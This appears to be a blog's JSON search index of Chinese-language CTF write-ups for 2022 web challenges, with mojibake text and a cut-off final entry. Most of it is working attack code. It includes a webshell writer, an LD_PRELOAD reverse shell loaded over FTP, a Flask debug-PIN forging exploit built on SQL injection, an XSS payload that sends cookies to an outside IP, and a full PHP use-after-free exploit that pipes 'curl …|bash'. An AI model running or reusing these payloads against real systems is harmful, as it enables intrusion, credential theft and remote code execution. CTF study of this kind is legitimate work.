&quot;.EV.&quot;(&quot;.D.&quot;_POST['a']);&quot;);echo (GETCONT)('./shell.php');class splf extends SplFileObject { public function __destruct() { parent::fwrite(SHELL); }}define(&quot;PHARA&quot;, new splf('shell.php','w')); è·å¾—ä¸€å¥è¯æœ¨é©¬çš„shellä»¥åï¼Œå°±éœ€è¦ç»•ä¸€ä¸‹disable_functionäº†ï¼Œè¿™é‡Œä¸€èˆ¬è€ƒè™‘çš„ä¹Ÿæ˜¯å†™å…¥ldæ›´æ”¹ç¯å¢ƒå˜é‡ å†™å…¥ç¯å¢ƒå˜é‡æ˜¯é€šè¿‡åœ¨æœ¬åœ°æ­å»ºä¸€ä¸ªftpæœåŠ¡ï¼Œç„¶å a=$local_file = '/tmp/hack1.so';$server_file = 'hack.so';$ftp_server = '110.xxxx.120';$ftp_port=25;$ftp = ftp_connect($ftp_server,$ftp_port);$login_result = ftp_login($ftp, 'anonymous', '');ftp_pasv($ftp,1);if (ftp_get($ftp, $local_file, $server_file, FTP_BINARY)) { echo &quot;Successfully written to $local_file\\n&quot;;} else { echo &quot;There was a problem\\n&quot;;}ftp_close($ftp); è¿™é‡Œå€¼å¾—ä¸€æçš„æ˜¯ï¼Œè¿™ä¸ªftpæœåŠ¡åº”è¯¥æ˜¯è¦å’Œsoæ–‡ä»¶æ”¾åœ¨åŒä¸€ç›®å½•ä¸‹ï¼Œä¸ç„¶å°±è¦å†™ç»å¯¹è·¯å¾„ï¼ˆåº”è¯¥æ˜¯è¿™æ ·ï¼‰ï¼Œç„¶åå¦‚æœä½ è¦æ˜¯ç”¨æœ¬æ¥å·²ç»å¼€å¯çš„ftpæœåŠ¡ï¼Œéœ€è¦åœ¨loginé‚£è¾¹å†™ä¸€ä¸‹ä½ çš„è´¦å·å¯†ç æ‰è¡Œ è¿™ä¸ªæ—¶å€™å°±æˆåŠŸå†™å…¥äº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯putenv+mailå‡½æ•°åå¼¹shellå³å¯ putenv(&quot;LD_PRELOAD=/var/www/vhosts/topleadtool.com/httpdocs/inc/hack.so&quot;);mail(&quot;a@localhost&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;); æ‹¿flagçš„æ—¶å€™å‘ç°æƒé™ä¸å¤Ÿï¼Œéœ€è¦ææƒï¼Œæœ€è¿‘çš„é‚£ä¸ªæ´ä¸è¡Œï¼Œæ‰€ä»¥suidå°è¯•ä¸€ä¸‹ find /bin -perm -u=s -type f 2&gt;/dev/nullfind /usr -perm -u=s -type f 2&gt;/dev/nullfind / -perm -u=s -type f 2&gt;/dev/null æ–°å­¦äº†å‡ ä¸ªå§¿åŠ¿ï¼Œç„¶åå°±å¯ä»¥getshelläº†","link":"/2022/03/27/2022DASCTF-3/"},{"title":"2022Dest0gè¿æ–°èµ›","text":"##phpdestç»•è¿‡require_onceé™åˆ¶ /proc/selfæŒ‡å‘å½“å‰è¿›ç¨‹çš„/proc/pid/ï¼Œ/proc/self/root/æ˜¯æŒ‡å‘/çš„ç¬¦å·é“¾æ¥payload:php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self ##EasyPHPåœ¨è¿™é‡Œå¯ä»¥çœ‹åˆ°è‡ªå®šä¹‰äº†ä¸€ä¸ªæŠ¥é”™ï¼Œå½“äº§ç”Ÿé”™è¯¯çš„æ—¶å€™ï¼Œå°±ä¼šæ‰§è¡Œè¿™ä¸ªæŠ¥é”™å†…å®¹set_error_handler( function() use(&amp;$fl4g) { print $fl4g; }); å‰é¢çš„ä»£ç éƒ½æ˜¯å¹²æ‰°ï¼Œæˆ‘ä»¬é‡ç‚¹éœ€è¦å…³æ³¨çš„å…¶å®æ˜¯æˆ‘ä»¬çš„è¾“å…¥ä¼šåšå‡ºä»€ä¹ˆæ“ä½œï¼Œå¯ä»¥å‘ç°ï¼Œæˆ‘ä»¬è¾“å…¥çš„å†…å®¹æœ€åä¼šå’Œ$fl4gåšæ‹¼æ¥æ“ä½œï¼Œç»“åˆå‰é¢çš„è‡ªå®šä¹‰æŠ¥é”™ï¼Œé‚£æˆ‘ä»¬åªéœ€è¦è®©è¾“å…¥çš„å†…å®¹ä¸ºæ•°ç»„å³å¯ï¼Œå› ä¸ºæ•°ç»„å’Œå­—ç¬¦ä¸²ç›´æ¥æ‹¼æ¥æ—¶ä¼šäº§ç”ŸæŠ¥é”™ çªç„¶æƒ³åˆ°ä¹‹å‰ï¼Œå¦‚æœä¸çŸ¥é“é¢˜ç›®çš„è€ƒå¯Ÿç‚¹ï¼Œæ•°ç»„å•¥çš„éƒ½å…ˆè¯•è¯•å†è¯´##simplerce","link":"/2022/11/15/2022Dest0g3%E8%BF%8E%E6%96%B0%E8%B5%9B/"},{"title":"2022-starCTF","text":"å‰è¨€è·Ÿç€EDIæ‰“äº†ï¼Œä½†æ˜¯æ„Ÿè§‰ç¯å¢ƒæŒºå‘çš„â€“ oh-my-noteproè´¦å·å¯†ç å¼±å£ä»¤ç™»å½•ï¼Œç„¶åï¼Œé€šè¿‡create ä¸€ä¸ªnote å¯ä»¥æŸ¥è¯¢ï¼Œå‘ç° http://123.60.72.85:5002/view?note_id=p1ee659ofrlcro12mm3kp9ey5hwg464d æŠ¥é”™å­˜åœ¨flaskçš„debugæŠ¥é”™é¡µé¢ï¼Œå­˜åœ¨sqlçš„å †å æ³¨å…¥ å› ä¸ºæ˜¯pythonçš„è¯­è¨€ï¼Œæ¯”è¾ƒæœ‰é™ï¼Œå› æ­¤ç°åœ¨çš„æ€è·¯å°±æ˜¯è¯»å–æ–‡ä»¶ä¼ªé€ ä¸€ä¸‹pinç ï¼š expå¦‚ä¸‹ï¼š import randomimport requestsimport stringimport reimport hashlibfrom itertools import chaindef pin_mes(): s=requests.session() url=&quot;http://121.37.153.47:5002/view?note_id=&quot; session=&quot;session=eyJjc3JmX3Rva2VuIjoiZWJiZmZjNDFlNGQ5YzQxODFjMDZhYTBjNWZjZjIyZDg2NzAzMTZkMyIsInVzZXJuYW1lIjoiYSJ9.YlpPdw.4WCCNhQrbYsuRjp00IeRuAtJZ7U&quot; headers={ &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Cookie&quot;: session, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot; }# 1.usernameï¼Œç”¨æˆ·å# 2. uuidnodeï¼Œå½“å‰ç½‘ç»œçš„macåœ°å€çš„åè¿›åˆ¶æ•°# 3. machine_idï¼Œdockeræœºå™¨id#dockeré¶æœºç”±åé¢ä¸‰ä¸ªåˆå¹¶ï¼š1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup pin_me=['/etc/passwd','/sys/class/net/eth0/address','/etc/machine-id','/proc/self/cgroup'] mess=[] find_data=re.compile(r&quot;&quot;&quot; &lt;h1 style=\\&quot;text-align: center\\&quot;&gt; (.*?) &lt;/h1&gt; &quot;&quot;&quot;) for i in pin_me: ran_str = ''.join(random.sample(string.ascii_letters + string.digits, 7)) payload=f&quot;1';CREATE TABLE {ran_str} (go TEXT)%23&quot; s.get(url+payload,headers=headers) payload2=f&quot;1';load data local infile \\&quot;{i}\\&quot; into table {ran_str}%23&quot; s.get(url + payload2,headers=headers) payload3=f&quot;1'union select 1,2,3,4,group_concat(go) from {ran_str}%23&quot; r=s.get(url + payload3,headers=headers).text #print(r) data=re.findall(find_data,r) mess.append(data) return messdef get_pypin(gd,ma,cg): probably_public_bits = [ 'ctf', # username 'flask.app', # modname 'Flask', # getattr(app, '__name__', getattr(app.__class__, '__name__')) '/usr/local/lib/python3.8/site-packages/flask/app.py' # getattr(mod, '__file__', None), ] private_bits = [ f'{gd}', # str(uuid.getnode()), /sys/class/net/ens33/address # e86c4117-eed3-4a37-82bc-b5fa47a88e0b eabeaffb4e97696bfb087df1717743237ff21f537c0f36676dd49ae6c6065d7e f'{ma+cg}' # get_machine_id(), /etc/machine-id ] h = hashlib.sha1() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit) h.update(b'cookiesalt') cookie_name = '__wzd' + h.hexdigest()[:20] num = None if num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9] rv = None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = num print(rv)if __name__==&quot;__main__&quot;: pin_data=pin_mes() print(pin_data[1]) gd = int(&quot;&quot;.join(&quot;&quot;.join(pin_data[1]).split(&quot;:&quot;)),16) ma=str(&quot;&quot;.join(pin_data[2])) cg = re.findall(r&quot;docker/(.*?),&quot;, str(pin_data[3]))[0] get_pypin(gd,ma,cg) æ‹¿åˆ°pinç ä»¥åå°±å¯ä»¥æ‰§è¡Œå‘½ä»¤ ç„¶åæ¯”è¾ƒå¥‡æ€ªçš„åœ°æ–¹å°±æ˜¯ï¼Œæœ‰çš„æ—¶å€™consoleé¡µé¢ä¼šæ˜¾ç¤ºnot foundï¼Œè¿™é‡Œå‡ºé¢˜äººç»™å‡ºçš„æ„è§æ˜¯ æ¸…é™¤ç¼“å­˜å³å¯ã€‚ oh-my-lottoæ‹¿åˆ°flagçš„æ¡ä»¶æ˜¯è®©forecast==lotto_resultï¼Œå› æ­¤","link":"/2022/04/17/2022-startCTF/"},{"title":"2022LINE-CTF","text":"","link":"/2022/03/30/2022LINE-CTF/"},{"title":"2022idekctf","text":"##json Beautifier","link":"/2022/02/01/2022idekctf/"},{"title":"2022plaidctf","text":"yacaä¸»è¦çš„æ¼æ´ç‚¹åœ¨è¿™ä¸ªä½ç½®,è¿™é‡Œçš„content-typeå¯ä»¥æ›¿æ¢æˆå…¶ä»–å†…å®¹ï¼Œè¿™æ ·å¯ä»¥åŠ¨æ€æ‰§è¡Œjsçš„å†…å®¹è¿™é‡Œæè¿°ä¸€ä¸‹ä¸¤ç§æ–¹æ³• importmapè¿™ä¸ªæ˜¯é˜Ÿå†…å¸ˆå‚…åšå‡ºæ¥çš„æ–¹æ³•ï¼Œå‚è€ƒé“¾æ¥ï¼šhttps://www.digitalocean.com/community/tutorials/how-to-dynamically-import-javascript-with-import-maps#step-3-loading-external-code-with-import-maps content-typeè®¾ä¸ºimportmapçš„æ—¶å€™ï¼Œå¯ä»¥åŠ¨æ€åŠ è½½jsçš„ä»£ç ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š &lt;script type=&quot;importmap&quot;&gt;{ &quot;imports&quot;:{ }}&lt;/script&gt; ç”±äºæ— æ³•å¯¼å…¥å¤–éƒ¨çš„jsï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½åŠ«æŒæœ¬åœ°çš„jsï¼Œé€šè¿‡åŠ¨æ€åŠ è½½æœ¬åœ°çš„eval-code.mjsä¹Ÿå¯ä»¥å®ç°ï¼Œç»“æœå¦‚ä¸‹ï¼š { &quot;type&quot;:&quot;importmap&quot;, &quot;program&quot;:{ &quot;name&quot;:&quot;new program&quot;, &quot;scopes&quot;:{ &quot;/js/&quot;:{ &quot;/js/ast-to-js.mjs&quot;:&quot;/js/eval-code.mjs&quot; } }, &quot;code&quot;:&quot;{\\&quot;code\\&quot;:\\&quot;window.location.href='http://110.42.133.120:9999?flag='+document.cookie\\&quot;,\\&quot;variables\\&quot;:[]}&quot; }} å¤ç°æˆåŠŸ å¦‚ä½•è°ƒç”¨eval-code.jsä¸Šé¢å…¶ä»–éƒ¨åˆ†çš„åŸç†éƒ½æŒºæ¸…æ™°çš„ï¼Œå°±æ˜¯è¿™é‡Œå¦‚ä½•è°ƒç”¨æœ‰äº›é—®é¢˜,æƒ³è¦çœ‹è°ƒç”¨è¿‡ç¨‹è¿˜å¾—å»debugå§debugå¤±è´¥ï¼Œæ‰€ä»¥è¿˜æ˜¯ç»§ç»­è¯»äº†ä¸€ä¸‹æºç ï¼Œå‘ç°åœ¨calcä¸­å­˜åœ¨evalCodeå’Œjsçš„evalä¹Ÿæ˜¯ä¸€ä¸ªä¸œè¥¿ï¼Œé‡ç‚¹å…³æ³¨ä¸€ä¸‹ä¼ å…¥å‚æ•°çš„æ–¹å¼ä»¥åŠå‚æ•° å¯ä»¥å‘ç°åœ¨caclè®¡ç®—æ¨¡å—å½“ä¸­ä½¿ç”¨çš„æ–¹æ³•æ˜¯è¿™æ ·çš„ï¼Œä¼ ä¸€ä¸ªå‚æ•°åä¸ºcodeï¼Œå¹¶ä¸”ä¸ºjsonæ ¼å¼çš„å³å¯ æ‰§è¡Œçš„æµç¨‹å¦‚ä¸‹ï¼šä¸€å¼€å§‹å·²ç»ç»è¿‡è®¡ç®—äº†ï¼Œåé¢ç”¨å†ä¸€æ¬¡å¯¼å…¥è¿™ä¸ªmjsæ–‡ä»¶ï¼Œæ€»å…±æ˜¯å¯¼å…¥ä¸¤æ¬¡ /js/eval-code.mjs åœ¨ç¬¬äºŒæ¬¡çš„æ—¶å€™æ‰§è¡Œäº†codeé‡Œé¢çš„codeå‚æ•°ï¼ŒåŠ«æŒæˆåŠŸ å°ç»“ï¼šè¿™é¢˜æƒ³è¦è§£å‡ºæ¥ï¼Œé¦–å…ˆè¦å®šä½åˆ°é‚£ä¸ªcontentï¼Œä¸€å¼€å§‹å†çœ‹è¿™ä¸ªé¢˜ç›®çš„æ—¶å€™ï¼Œå°±æ„Ÿè§‰è¿™é‡ŒæŒºå¥‡æ€ªçš„ï¼Œä¸è¿‡é‚£ä¸¤å¤©æœ‰å…¶ä»–äº‹æƒ…è¦åšï¼Œæ‰€ä»¥å°±æ²¡æ€ä¹ˆçœ‹äº†ï¼Œç„¶åæ¥ä¸‹æ¥éœ€è¦ç†æ¸…æ¥šçš„æ˜¯ï¼š1.å¯ä»¥ä½¿ç”¨è¿™ä¸ªimportmapç±»å‹è¿›è¡Œæ“ä½œï¼Œè€Œè¿™ä¸ªç±»å‹æ˜¯å…è®¸å¯¼å…¥å…¶ä»–jsæ¨¡å—è¿›è¡ŒåŠ¨æ€åŠ è½½çš„ï¼Œç”±äºä¸èƒ½å¯¼å…¥å…¶ä»–å¤–éƒ¨ï¼Œåªèƒ½è°ƒç”¨å†…éƒ¨çš„ï¼Œè€Œè¿™ä¸ªeval-code.mjsï¼Œå…¶å®ç¿»ä¸€ä¸‹æ–‡ä»¶å°±å¯ä»¥å‘ç°äº†2.å¯¹è¿™ä¸ªæ–‡ä»¶è¿›è¡Œè°ƒç”¨çš„æ–¹å¼ä¸º:ä¸»è¦æ˜¯é’ˆå¯¹æ–‡ä»¶çš„æºç è¿›è¡Œå®¡è®¡ã€‚","link":"/2022/04/09/2022plaidctf/"},{"title":"2022vnctf-rceå°ç»“","text":"InterestingPHPéé¢„æœŸâ€”â€”bypass_disable&lt;?php highlight_file(__FILE__); @eval($_GET['exp']);?&gt; æµ‹è¯•äº†ä¸€ä¸‹ï¼Œå¯ä»¥ä½¿ç”¨file_put_contentsï¼Œä½†æ˜¯å…¶ä»–çš„å‘½ä»¤æ‰§è¡Œä¸äº† æˆ‘ä»¬å¯ä»¥æŸ¥çœ‹ä¸€ä¸‹disable_function,ä½†æ˜¯ç”±äºphpinfo()ç”¨ä¸äº† var_dump(ini_get_all()); å¯ä»¥å‘ç°disable_functionè¿‡æ»¤äº†å¾ˆå¤šä¸œè¥¿ï¼Œåº”è¯¥å°±æ˜¯è¦ç»•äº† æ—¢ç„¶å¯ä»¥å†™å…¥æ–‡ä»¶ï¼Œå…ˆè¯•è¯•ä¸€äº›disable_functionå®ç°rce https://github.com/mm0r1/exploits è¿™é‡Œæœ‰ä¸ªæ€è·¯ä¹Ÿå¾ˆå·§å¦™ï¼Œå­¦ä¹ ä¸€ä¸‹ï¼Œå°±æ˜¯é€šè¿‡å‘é€æ–‡ä»¶çš„å½¢å¼ï¼Œè¿™æ ·çš„è¯ï¼Œå°±ä¸ç”¨ä¸€ç›´ä½¿ç”¨file_put_contentså»å†™æ–‡ä»¶å‘½ä»¤æ‰§è¡Œï¼Œå¯ä»¥ç›´æ¥åœ¨ä¸€ä¸ªé¡µé¢ ä½†æ˜¯éœ€è¦æ³¨æ„å‘é€æ–‡ä»¶çš„æ ¼å¼ Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryj28zfvoWVxnHdp29Content-Length: 144------WebKitFormBoundaryj28zfvoWVxnHdp29Content-Disposition: form-data; name=&quot;1&quot;var_dump(&quot;a&quot;);------WebKitFormBoundaryj28zfvoWVxnHdp29-- ç„¶åå°†rceçš„è„šæœ¬è´´è¿‡æ¥ï¼Œä½†æ˜¯ä¸èƒ½é©¬ä¸Šç”¨ï¼Œå› ä¸ºdisable_functionä¸­è¿‡æ»¤äº†fwriteï¼Œéœ€è¦æ‰¾æ›¿ä»£ï¼Œä½¿ç”¨fputs,ä½¿ç”¨CVE-2021-4034è¿›è¡Œææƒ ä½¿ç”¨ä¸€ä¸ªè„šæœ¬ä¸Šä¼ ä¸€ä¸‹ï¼Œæˆ‘ä¸€ç›´åœ¨æƒ³å¦‚ä½•å°†æ–‡ä»¶å†™å…¥ï¼Œå› ä¸ºæ€ä¹ˆå†™å¥½åƒéƒ½æœ‰é—®é¢˜ã€‚ å…¶å®å¯ä»¥å°†ä»–æ”¾åœ¨æœåŠ¡å™¨ä¸Šï¼Œç„¶ååˆ©ç”¨curlå‘½ä»¤ä¸‹è½½è¿‡å»ã€‚åˆæŒæ¡ä¸€ä¸ªæ–°å§¿åŠ¿ã€‚ã€‚ã€‚æˆ‘è¿˜åœ¨ä¸€ç›´ç”¨pythonè„šæœ¬å†™ï¼Œè€Œä¸”ç©¿è¿‡å»ä»¥åï¼Œæˆ‘å‘ç°ä½¿ç”¨é‚£è¾¹çš„gccä¹Ÿæ²¡æ³•ç¼–è¯‘æˆåŠŸã€‚ã€‚ã€‚ æ‰€ä»¥æˆ‘ç›´æ¥åœ¨æœåŠ¡å™¨ç¼–è¯‘äº†ï¼Œç„¶åå‘é€è¿‡å» å®Œæ•´å‘½ä»¤æ‰§è¡Œå†…å®¹ POST /?exp=eval($_POST[1]); HTTP/1.1Host: c9be48e4-3f0c-4ebd-8cc6-ba5f826890d0.node4.buuoj.cn:81User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: UM_distinctid=17c6332d1772a3-003cfe433760328-4c3e2679-144000-17c6332d178a88Upgrade-Insecure-Requests: 1Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryj28zfvoWVxnHdp29Content-Length: 6949------WebKitFormBoundaryj28zfvoWVxnHdp29Content-Disposition: form-data; name=&quot;1&quot;pwn('curl http://110.42.133.120/tlife|bash ');function pwn($cmd) { define('LOGGING', false); define('CHUNK_DATA_SIZE', 0x60); define('CHUNK_SIZE', ZEND_DEBUG_BUILD ? CHUNK_DATA_SIZE + 0x20 : CHUNK_DATA_SIZE); define('FILTER_SIZE', ZEND_DEBUG_BUILD ? 0x70 : 0x50); define('STRING_SIZE', CHUNK_DATA_SIZE - 0x18 - 1); define('CMD', $cmd); for($i = 0; $i &lt; 10; $i++) { $groom[] = Pwn::alloc(STRING_SIZE); } stream_filter_register('pwn_filter', 'Pwn'); $fd = fopen('php://memory', 'w'); stream_filter_append($fd,'pwn_filter'); fputs($fd, 'x');}class Helper { public $a, $b, $c; }class Pwn extends php_user_filter { private $abc, $abc_addr; private $helper, $helper_addr, $helper_off; private $uafp, $hfp; public function filter($in, $out, &amp;$consumed, $closing) { if($closing) return; stream_bucket_make_writeable($in); $this-&gt;filtername = Pwn::alloc(STRING_SIZE); fclose($this-&gt;stream); $this-&gt;go(); return PSFS_PASS_ON; } private function go() { $this-&gt;abc = &amp;$this-&gt;filtername; $this-&gt;make_uaf_obj(); $this-&gt;helper = new Helper; $this-&gt;helper-&gt;b = function($x) {}; $this-&gt;helper_addr = $this-&gt;str2ptr(CHUNK_SIZE * 2 - 0x18) - CHUNK_SIZE * 2; $this-&gt;log(&quot;helper @ 0x%x&quot;, $this-&gt;helper_addr); $this-&gt;abc_addr = $this-&gt;helper_addr - CHUNK_SIZE; $this-&gt;log(&quot;abc @ 0x%x&quot;, $this-&gt;abc_addr); $this-&gt;helper_off = $this-&gt;helper_addr - $this-&gt;abc_addr - 0x18; $helper_handlers = $this-&gt;str2ptr(CHUNK_SIZE); $this-&gt;log(&quot;helper handlers @ 0x%x&quot;, $helper_handlers); $this-&gt;prepare_leaker(); $binary_leak = $this-&gt;read($helper_handlers + 8); $this-&gt;log(&quot;binary leak @ 0x%x&quot;, $binary_leak); $this-&gt;prepare_cleanup($binary_leak); $closure_addr = $this-&gt;str2ptr($this-&gt;helper_off + 0x38); $this-&gt;log(&quot;real closure @ 0x%x&quot;, $closure_addr); $closure_ce = $this-&gt;read($closure_addr + 0x10); $this-&gt;log(&quot;closure class_entry @ 0x%x&quot;, $closure_ce); $basic_funcs = $this-&gt;get_basic_funcs($closure_ce); $this-&gt;log(&quot;basic_functions @ 0x%x&quot;, $basic_funcs); $zif_system = $this-&gt;get_system($basic_funcs); $this-&gt;log(&quot;zif_system @ 0x%x&quot;, $zif_system); $fake_closure_off = $this-&gt;helper_off + CHUNK_SIZE * 2; for($i = 0; $i &lt; 0x138; $i += 8) { $this-&gt;write($fake_closure_off + $i, $this-&gt;read($closure_addr + $i)); } $this-&gt;write($fake_closure_off + 0x38, 1, 4); $handler_offset = PHP_MAJOR_VERSION === 8 ? 0x70 : 0x68; $this-&gt;write($fake_closure_off + $handler_offset, $zif_system); $fake_closure_addr = $this-&gt;helper_addr + $fake_closure_off - $this-&gt;helper_off; $this-&gt;write($this-&gt;helper_off + 0x38, $fake_closure_addr); $this-&gt;log(&quot;fake closure @ 0x%x&quot;, $fake_closure_addr); $this-&gt;cleanup(); ($this-&gt;helper-&gt;b)(CMD); } private function make_uaf_obj() { $this-&gt;uafp = fopen('php://memory', 'w'); fputs($this-&gt;uafp, pack('QQQ', 1, 0, 0xDEADBAADC0DE)); for($i = 0; $i &lt; STRING_SIZE; $i++) { fputs($this-&gt;uafp, &quot;\\x00&quot;); } } private function prepare_leaker() { $str_off = $this-&gt;helper_off + CHUNK_SIZE + 8; $this-&gt;write($str_off, 2); $this-&gt;write($str_off + 0x10, 6); $val_off = $this-&gt;helper_off + 0x48; $this-&gt;write($val_off, $this-&gt;helper_addr + CHUNK_SIZE + 8); $this-&gt;write($val_off + 8, 0xA); } private function prepare_cleanup($binary_leak) { $ret_gadget = $binary_leak; do { --$ret_gadget; } while($this-&gt;read($ret_gadget, 1) !== 0xC3); $this-&gt;log(&quot;ret gadget = 0x%x&quot;, $ret_gadget); $this-&gt;write(0, $this-&gt;abc_addr + 0x20 - (PHP_MAJOR_VERSION === 8 ? 0x50 : 0x60)); $this-&gt;write(8, $ret_gadget); } private function read($addr, $n = 8) { $this-&gt;write($this-&gt;helper_off + CHUNK_SIZE + 16, $addr - 0x10); $value = strlen($this-&gt;helper-&gt;c); if($n !== 8) { $value &amp;= (1 &lt;&lt; ($n &lt;&lt; 3)) - 1; } return $value; } private function write($p, $v, $n = 8) { for($i = 0; $i &lt; $n; $i++) { $this-&gt;abc[$p + $i] = chr($v &amp; 0xff); $v &gt;&gt;= 8; } } private function get_basic_funcs($addr) { while(true) { // In rare instances the standard module might lie after the addr we're starting // the search from. This will result in a SIGSGV when the search reaches an unmapped page. // In that case, changing the direction of the search should fix the crash. // $addr += 0x10; $addr -= 0x10; if($this-&gt;read($addr, 4) === 0xA8 &amp;&amp; in_array($this-&gt;read($addr + 4, 4), [20151012, 20160303, 20170718, 20180731, 20190902, 20200930])) { $module_name_addr = $this-&gt;read($addr + 0x20); $module_name = $this-&gt;read($module_name_addr); if($module_name === 0x647261646e617473) { $this-&gt;log(&quot;standard module @ 0x%x&quot;, $addr); return $this-&gt;read($addr + 0x28); } } } } private function get_system($basic_funcs) { $addr = $basic_funcs; do { $f_entry = $this-&gt;read($addr); $f_name = $this-&gt;read($f_entry, 6); if($f_name === 0x6d6574737973) { return $this-&gt;read($addr + 8); } $addr += 0x20; } while($f_entry !== 0); } private function cleanup() { $this-&gt;hfp = fopen('php://memory', 'w'); fputs($this-&gt;hfp, pack('QQ', 0, $this-&gt;abc_addr)); for($i = 0; $i &lt; FILTER_SIZE - 0x10; $i++) { fputs($this-&gt;hfp, &quot;\\x00&quot;); } } private function str2ptr($p = 0, $n = 8) { $address = 0; for($j = $n - 1; $j &gt;= 0; $j--) { $address &lt;&lt;= 8; $address |= ord($this-&gt;abc[$p + $j]); } return $address; } private function ptr2str($ptr, $n = 8) { $out = ''; for ($i = 0; $i &lt; $n; $i++) { $out .= chr($ptr &amp; 0xff); $ptr &gt;&gt;= 8; } return $out; } private function log($format, $val = '') { if(LOGGING) { printf(&quot;{$format}\\n&quot;, $val); } } static function alloc($size) { return str_shuffle(str_repeat('A', $size)); }}------WebKitFormBoundaryj28zfvoWVxnHdp29-- é¢„æœŸè§£:redisä¸»ä»å¤åˆ¶rceå†™é©¬è¿›å»ä»¥åï¼Œå‘ç°æœ‰ä¸€ä»½redisçš„è´¦å·å¯†ç ,é‚£åº”è¯¥å°±æ˜¯ä¸»ä»å¤åˆ¶åŠ è½½soæ–‡ä»¶äº†ï¼Œæƒ³ç”¨æ’ä»¶ç›´æ¥è¯•è¯•ï¼Œå‘ç°ç«¯å£ä¸æ˜¯6379.çŒœæµ‹å¯èƒ½æ²¡å¼€redisæœåŠ¡ å­¦ä¹ ä¸€ä¸‹ï¼š åˆ©â½¤ get_loaded_extensions() å¯ä»¥çœ‹åˆ°PHPåŠ è½½çš„æ’ä»¶ï¼Œä»ä¸­å¯ä»¥çœ‹åˆ°é¢˜â½¬ç¯å¢ƒä¸­åŠ è½½äº†PHPçš„redisæ’ä»¶ ï¼ˆredis.soï¼‰ï¼Œç¿»æ‰¾â¼€ä¸‹â½‚æ¡£å¯ä»¥æ‰¾åˆ°è¿™ä¸ªæ’ä»¶çš„Redisç±»ä¸­æœ‰ rawCommand() â½…æ³•å¯ä»¥æ‰§â¾redisçš„å‘½ä»¤æ“ä½œã€‚åˆ©ç”¨ file_put_contents() å†™æ¶æ„soæ–‡ä»¶ï¼Œæ¥ç€è½½å…¥æ¶æ„.soæ–‡ä»¶æ¨¡å—ï¼Œåå¼¹shellè‡³è¿œç¨‹ä¸»æœº var_dump(get_loaded_extensions()); å¯ä»¥å‘ç°ï¼ŒåŠ è½½äº†redisçš„æ’ä»¶ï¼Œå°è¯•è¿è¡Œä¸€ä¸‹å¼€å¯æœåŠ¡ è¿˜éœ€è¦æ‰¾åˆ°å¼€æ”¾çš„ç«¯å£æ¥æ‰“åœ¨redisæœåŠ¡ï¼Œæ‰€ä»¥è¿˜éœ€è¦æ‰«æ ä¸€ä¸‹ç«¯å£ &lt;?phphighlight_file(__FILE__);# Port scanfor($i=0;$i&lt;65535;$i++) { $t=stream_socket_server(&quot;tcp://0.0.0.0:&quot;.$i,$ee,$ee2); if($ee2 === &quot;Address already in use&quot;) { var_dump($i); }} è¿™é‡Œæœ‰ä¸ªå°tipï¼šå†™å…¥æ–‡ä»¶çš„æ—¶å€™ï¼Œè½¬ä¸ºbase64å†™å…¥å°±ä¸ç”¨ç®¡è½¬ä¹‰çš„äº‹äº† $a=&quot;PD9waHAKaGlnaGxpZ2h0X2ZpbGUoX19GSUxFX18pOwojIFBvcnQgc2Nhbgpmb3IoJGk9MDskaTw2NTUzNTskaSsrKSB7CiAgJHQ9c3RyZWFtX3NvY2tldF9zZXJ2ZXIoInRjcDovLzAuMC4wLjA6Ii4kaSwkZWUsJGVlMik7CiAgaWYoJGVlMiA9PT0gIkFkZHJlc3MgYWxyZWFkeSBpbiB1c2UiKSB7CiAgICB2YXJfZHVtcCgkaSk7CiAgfQp9Cg==&quot;;file_put_contents(&quot;a.php&quot;,base64_decode($a)); æ¥ä¸‹æ¥å‘ç°çš„æ­¥éª¤å°±è¿˜æ˜¯ææƒäº†","link":"/2022/02/22/2022vnctf/"},{"title":"SSRFæ‰“æ•°æ®åº“","text":"SSRFæ‰“redisä¹‹å‰å­¦äº†ä¸€ä¸‹æ‰“redisçš„å‡ ç§å§¿åŠ¿ï¼Œæ‰€ä»¥ç°åœ¨æ¥å¤ç°ä¸€ä¸‹å‡ ä¸ªå‡½æ•°å­¦ä¹ ä¸‹ï¼š parse_url()#è§£æ URLï¼Œè¿”å›å…¶ç»„æˆéƒ¨åˆ†#è¦è§£æçš„ URLã€‚æ— æ•ˆå­—ç¬¦å°†ä½¿ç”¨ _ æ¥æ›¿æ¢ã€‚eg:&lt;?php$url = 'http://username:password@hostname/path?arg=value#anchor';print_r(parse_url($url));echo parse_url($url, PHP_URL_PATH);?&gt;è¾“å‡º:Array( [scheme] =&gt; http [host] =&gt; hostname [user] =&gt; username [pass] =&gt; password [path] =&gt; /path [query] =&gt; arg=value [fragment] 